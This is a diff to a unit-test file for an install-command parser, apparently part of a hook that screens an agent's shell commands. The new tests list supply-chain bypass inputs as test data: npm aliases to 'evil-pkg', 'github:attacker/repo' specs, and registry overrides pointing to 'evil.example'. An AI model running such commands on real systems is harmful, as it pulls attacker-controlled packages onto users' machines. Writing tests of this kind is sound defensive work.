@@ -254,7 +254,26 @@ class TestInstallCommandParsing(unittest.TestCase):
         self.assertEqual(parse_install_command("npm install"), [])  # lockfile install: nothing named
         t = parse_install_command("npm install user/repo ./local.tgz --registry https://r.example")
         self.assertEqual([x.direct_source for x in t[:2]], ["user/repo", "./local.tgz"])
-        self.assertEqual(t[2].custom_index, "https://r.example")
+        self.assertEqual(t[2].custom_index, "--registry https://r.example")
+
+    def test_npm_bypasses_are_caught(self):
+        # Alias or git/file spec written after a name: not a registry install of that name.
+        for cmd in ("npm install lodash@npm:evil-pkg", "npm i @scope/pkg@github:attacker/repo",
+                    "npm i foo@file:../evil", "npm i foo@git+https://x/y.git"):
+            t = parse_install_command(cmd)
+            self.assertEqual([x.spec for x in t if x.spec], [], cmd)
+            self.assertTrue(t and t[0].direct_source, cmd)
+        # pnpm's -w takes no value, so the package after it must still be checked.
+        self.assertEqual(self.specs("pnpm add -w evil-pkg"), ["npm:evil-pkg"])
+        self.assertEqual(self.specs("npm i -w web evil-pkg"), ["npm:evil-pkg"])  # npm's -w does
+        # A registry set through the environment or a config file is reported.
+        t = parse_install_command("npm_config_registry=https://evil.example npm install react")
+        self.assertEqual(t[0].custom_index, "npm_config_registry=https://evil.example")
+        t = parse_install_command("PIP_INDEX_URL=https://evil/simple pip install requests")
+        self.assertEqual(t[0].custom_index, "PIP_INDEX_URL=https://evil/simple")
+        t = parse_install_command("npm i --userconfig ./evil.npmrc react")
+        self.assertEqual(t[0].custom_index, "--userconfig ./evil.npmrc")
+        self.assertEqual(parse_install_command("FOO=1 ls"), [])
 
     def test_hook_event_reading(self):
         self.assertEqual(read_hook_command('{"tool_name":"Bash","tool_input":{"command":"pip install x"}}'),
